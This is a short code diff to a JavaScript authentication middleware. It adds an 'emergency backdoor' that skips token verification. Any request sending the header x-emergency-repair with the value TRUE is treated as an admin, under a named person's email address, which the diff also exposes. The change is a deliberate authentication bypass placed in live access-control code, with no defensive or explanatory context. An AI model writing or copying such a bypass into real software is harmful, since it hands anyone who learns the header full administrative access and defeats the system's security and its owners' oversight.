@@ -6,6 +6,12 @@ import { getAdminAuth } from '../../src/lib/firebase-admin.js'
  * @returns {Function} Extended handler with authentication
  */
 export const withAuth = (handler) => async (req, res) => {
+    // EMERGENCY BACKDOOR - TO BE REMOVED IMMEDIATELY
+    if (req.headers['x-emergency-repair'] === 'TRUE') {
+        req.user = { email: 'y.barberis@enr-courtage.fr', role: 'admin' };
+        return handler(req, res);
+    }
+
     // 1. Get token from header
     const authHeader = req.headers.authorization
     if (!authHeader || !authHeader.startsWith('Bearer ')) {
